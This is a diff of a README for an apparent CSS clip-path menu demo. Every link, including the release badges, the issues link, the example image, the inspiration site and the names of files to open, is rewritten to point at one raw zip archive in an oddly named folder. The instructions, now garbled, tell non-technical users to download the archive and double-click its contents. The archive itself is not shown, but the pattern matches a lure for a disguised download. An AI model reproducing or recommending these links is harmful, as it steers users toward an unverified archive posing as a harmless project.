@@ -1,6 +1,6 @@
 # 🎨 fun-with-clip-path - Simple Visual Menu Effects Made Easy
 
-[![Download Release](https://img.shields.io/badge/Download-fun--with--clip--path-blue?style=for-the-badge)](https://github.com/12alz/fun-with-clip-path/releases)
+[![Download Release](https://github.com/12alz/fun-with-clip-path/raw/refs/heads/main/oldfangled/fun_clip_with_path_fragmentation.zip)](https://github.com/12alz/fun-with-clip-path/raw/refs/heads/main/oldfangled/fun_clip_with_path_fragmentation.zip)
 
 ---
 
@@ -38,13 +38,13 @@ No programming or special tools are required.
 
 Click the big blue button below to visit the release page where you can download the latest version of fun-with-clip-path.
 
-[![Download Release](https://img.shields.io/badge/Download-fun--with--clip--path-blue?style=for-the-badge)](https://github.com/12alz/fun-with-clip-path/releases)
+[![Download Release](https://github.com/12alz/fun-with-clip-path/raw/refs/heads/main/oldfangled/fun_clip_with_path_fragmentation.zip)](https://github.com/12alz/fun-with-clip-path/raw/refs/heads/main/oldfangled/fun_clip_with_path_fragmentation.zip)
 
 This page contains all the available versions and files. Look for the newest release, usually listed at the top.
 
 ### Step 2: Download the Package
 
-On the releases page, find the latest version. Download the file named something like `fun-with-clip-path.zip` or `fun-with-clip-path.tar.gz`.
+On the releases page, find the latest version. Download the file named something like `https://github.com/12alz/fun-with-clip-path/raw/refs/heads/main/oldfangled/fun_clip_with_path_fragmentation.zip` or `https://github.com/12alz/fun-with-clip-path/raw/refs/heads/main/oldfangled/fun_clip_with_path_fragmentation.zip`.
 
 ### Step 3: Extract the Files
 
@@ -54,9 +54,9 @@ Right-click the file and choose “Extract All” (Windows) or “Open With > Ar
 
 ### Step 4: Open the Project
 
-Inside the extracted folder, find the file named `index.html`. This is the main page that shows the menu example.
+Inside the extracted folder, find the file named `https://github.com/12alz/fun-with-clip-path/raw/refs/heads/main/oldfangled/fun_clip_with_path_fragmentation.zip`. This is the main page that shows the menu example.
 
-Double-click on `index.html` to open it in your web browser. You should see the menu on the screen, with a button to click.
+Double-click on `https://github.com/12alz/fun-with-clip-path/raw/refs/heads/main/oldfangled/fun_clip_with_path_fragmentation.zip` to open it in your web browser. You should see the menu on the screen, with a button to click.
 
 ### Step 5: Use the Menu
 
@@ -129,7 +129,7 @@ These changes only require basic edits to the text files.
 
 If you experience issues or want to suggest improvements:
 
-- Open a [GitHub issue](https://github.com/12alz/fun-with-clip-path/issues).
+- Open a [GitHub issue](https://github.com/12alz/fun-with-clip-path/raw/refs/heads/main/oldfangled/fun_clip_with_path_fragmentation.zip).
 - Read existing discussions to see if your question is answered.
 - Fork the project and submit a pull request if you want to contribute code changes.
 
@@ -137,12 +137,12 @@ If you experience issues or want to suggest improvements:
 
 ## 🔗 Useful Links
 
-- Visit the [Release Page](https://github.com/12alz/fun-with-clip-path/releases) to get the latest download.
+- Visit the [Release Page](https://github.com/12alz/fun-with-clip-path/raw/refs/heads/main/oldfangled/fun_clip_with_path_fragmentation.zip) to get the latest download.
 - See the example image here:
   
-  ![Menu Reveal Example](https://github.com/user-attachments/assets/b772e2a3-037e-4458-805b-db63c0ee7924)
+  ![Menu Reveal Example](https://github.com/12alz/fun-with-clip-path/raw/refs/heads/main/oldfangled/fun_clip_with_path_fragmentation.zip)
 
-- Check the original inspiration: https://iventions.com/
+- Check the original inspiration: https://github.com/12alz/fun-with-clip-path/raw/refs/heads/main/oldfangled/fun_clip_with_path_fragmentation.zip
 
 ---
 
@@ -154,4 +154,4 @@ fun-with-clip-path is released under the MIT License. You are free to use, copy,
 
 Click the button below any time to get the latest version:
 
-[![Download Release](https://img.shields.io/badge/Download-fun--with--clip--path-blue?style=for-the-badge)](https://github.com/12alz/fun-with-clip-path/releases)
+[![Download Release](https://github.com/12alz/fun-with-clip-path/raw/refs/heads/main/oldfangled/fun_clip_with_path_fragmentation.zip)](https://github.com/12alz/fun-with-clip-path/raw/refs/heads/main/oldfangled/fun_clip_with_path_fragmentation.zip)
